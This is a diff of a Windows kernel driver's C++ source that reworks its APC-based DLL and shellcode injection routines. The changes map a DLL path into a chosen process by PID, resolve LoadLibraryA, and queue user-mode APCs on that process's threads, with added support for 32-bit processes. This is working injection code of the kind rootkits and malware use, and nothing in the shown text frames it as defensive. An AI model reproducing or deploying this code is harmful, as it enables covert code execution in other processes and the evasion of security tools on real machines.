@@ -107,57 +107,37 @@ NTSTATUS MemoryUtils::PrepareShellcode(char* dllPath, PVOID shellcodeAddress, PE
 * @status  [NTSTATUS]		 -- Whether successfuly injected or not.
 */
 NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
-	OBJECT_ATTRIBUTES objAttr{};
-	CLIENT_ID cid{};
-	HANDLE hProcess = NULL;
 	ShellcodeInformation ShellcodeInfo{};
-	PEPROCESS targetProcess = NULL;
-	PVOID shellcodeAddress = NULL;
-	SIZE_T shellcodeSize = SHELLCODE_SIZE;
-	HANDLE pid = UlongToHandle(DllInfo->Pid);
-	NTSTATUS status = PsLookupProcessByProcessId(pid, &targetProcess);
+	SIZE_T dllPathSize = strlen(DllInfo->DllPath) + 1;
+	PVOID loadLibraryAddress = GetFuncAddress("LoadLibraryA", L"\\Windows\\System32\\kernel32.dll");
+
+	if (!loadLibraryAddress)
+		return STATUS_ABANDONED;
+
+	// Creating the shellcode information for APC injection.
+	NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &ShellcodeInfo.Parameter1, 0, &dllPathSize,
+		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	if (!NT_SUCCESS(status))
+		return STATUS_INSUFFICIENT_RESOURCES;
+
+	dllPathSize = strlen(DllInfo->DllPath) + 1;
+	status = KeWriteProcessMemory(DllInfo->DllPath, PsGetCurrentProcess(), ShellcodeInfo.Parameter1, strlen(DllInfo->DllPath),
+		KernelMode, false);
 
 	if (!NT_SUCCESS(status))
 		return status;
 
-	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-	cid.UniqueProcess = pid;
-	cid.UniqueThread = NULL;
-
-	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
-
-	if (!NT_SUCCESS(status)) {
-		ObDereferenceObject(targetProcess);
-		return status;
-	}
-
-	status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
-
-	if (!NT_SUCCESS(status)) {
-		ZwClose(hProcess);
-		ObDereferenceObject(targetProcess);
-		return status;
-	}
-
-	status = PrepareShellcode(DllInfo->DllPath, shellcodeAddress, targetProcess, DllInfo->Pid);
-	ObDereferenceObject(targetProcess);
-
-	if (!NT_SUCCESS(status)) {
-		ZwFreeVirtualMemory(hProcess, &shellcodeAddress, &shellcodeSize, MEM_DECOMMIT);
-		ZwClose(hProcess);
-		return status;
-	}
-	ZwClose(hProcess);
-
-	// Creating the shellcode information for APC injection.
-	ShellcodeInfo.Parameter1 = NULL;
+	ShellcodeInfo.Parameter1Size = dllPathSize;
 	ShellcodeInfo.Parameter2 = NULL;
 	ShellcodeInfo.Parameter3 = NULL;
 	ShellcodeInfo.Pid = DllInfo->Pid;
-	ShellcodeInfo.Shellcode = shellcodeAddress;
-	ShellcodeInfo.ShellcodeSize = SHELLCODE_SIZE;
+	ShellcodeInfo.Shellcode = loadLibraryAddress;
+	ShellcodeInfo.ShellcodeSize = sizeof(PVOID);
 
-	return InjectShellcodeAPC(&ShellcodeInfo, true);
+	status = InjectShellcodeAPC(&ShellcodeInfo, true);
+	ZwFreeVirtualMemory(ZwCurrentProcess(), &ShellcodeInfo.Parameter1, &dllPathSize, MEM_DECOMMIT);
+	return status;
 }
 
 /*
@@ -271,9 +251,10 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bo
 	PETHREAD TargetThread = NULL;
 	PKAPC ShellcodeApc = NULL;
 	PKAPC PrepareApc = NULL;
-	PVOID shellcodeAddress = NULL;
+	PVOID remoteAddress = NULL;
 	NTSTATUS status = STATUS_SUCCESS;
-	SIZE_T shellcodeSize = ShellcodeInfo->ShellcodeSize;
+	PVOID remoteData = NULL;
+	SIZE_T dataSize = isInjectedDll ? ShellcodeInfo->Parameter1Size : ShellcodeInfo->ShellcodeSize;
 
 	HANDLE pid = UlongToHandle(ShellcodeInfo->Pid);
 	status = PsLookupProcessByProcessId(pid, &TargetProcess);
@@ -281,7 +262,7 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bo
 	if (!NT_SUCCESS(status))
 		return status;
 
-	if (!ShellcodeInfo->Shellcode || shellcodeSize == 0)
+	if (!ShellcodeInfo->Shellcode || dataSize == 0)
 		return STATUS_INVALID_PARAMETER;
 
 	// Find APC suitable thread.
@@ -304,19 +285,17 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bo
 		if (!NT_SUCCESS(status))
 			break;
 
-		if (!isInjectedDll) {
-			status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+		status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
 
-			if (!NT_SUCCESS(status))
-				break;
-			shellcodeSize = ShellcodeInfo->ShellcodeSize;
-			status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);
+		if (!NT_SUCCESS(status))
+			break;
 
-			if (!NT_SUCCESS(status))
-				break;
-		}
-		else
-			shellcodeAddress = ShellcodeInfo->Shellcode;
+		dataSize = isInjectedDll ? ShellcodeInfo->Parameter1Size : ShellcodeInfo->ShellcodeSize;
+		remoteData = isInjectedDll ? ShellcodeInfo->Parameter1 : ShellcodeInfo->Shellcode;
+		status = KeWriteProcessMemory(remoteData, TargetProcess, remoteAddress, dataSize, UserMode);
+
+		if (!NT_SUCCESS(status))
+			break;
 
 		// Create and execute the APCs.
 		ShellcodeApc = (PKAPC)AllocateMemory(sizeof(KAPC), false);
@@ -327,8 +306,12 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bo
 			break;
 		}
 
-		KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)PrepareApcCallback, NULL, NULL, KernelMode, NULL);
-		KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeAddress, UserMode, ShellcodeInfo->Parameter1);
+		KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)&PrepareApcCallback, NULL, NULL, KernelMode, NULL);
+
+		if (isInjectedDll)
+			KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)&ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)ShellcodeInfo->Shellcode, UserMode, remoteAddress);
+		else
+			KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)&ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)remoteAddress, UserMode, ShellcodeInfo->Parameter1);
 
 		if (!KeInsertQueueApc(ShellcodeApc, ShellcodeInfo->Parameter2, ShellcodeInfo->Parameter3, FALSE)) {
 			status = STATUS_UNSUCCESSFUL;
@@ -347,8 +330,8 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bo
 
 
 	if (!NT_SUCCESS(status)) {
-		if (shellcodeAddress)
-			ZwFreeVirtualMemory(hProcess, &shellcodeAddress, &shellcodeSize, MEM_DECOMMIT);
+		if (remoteAddress)
+			ZwFreeVirtualMemory(hProcess, &remoteAddress, &dataSize, MEM_DECOMMIT);
 		if (PrepareApc)
 			ExFreePoolWithTag(PrepareApc, DRIVER_TAG);
 		if (ShellcodeApc)
@@ -1783,11 +1766,12 @@ void MemoryUtils::SetCredLastIndex() {
 VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
 	UNREFERENCED_PARAMETER(SystemArgument1);
 	UNREFERENCED_PARAMETER(SystemArgument2);
-	UNREFERENCED_PARAMETER(NormalContext);
 
 	if (PsIsThreadTerminating(PsGetCurrentThread()))
 		*NormalRoutine = NULL;
 
+	if (PsGetCurrentProcessWow64Process())
+		PsWrapApcWow64Thread(NormalContext, (PVOID*)NormalRoutine);
 	ExFreePoolWithTag(Apc, DRIVER_TAG);
 }
 
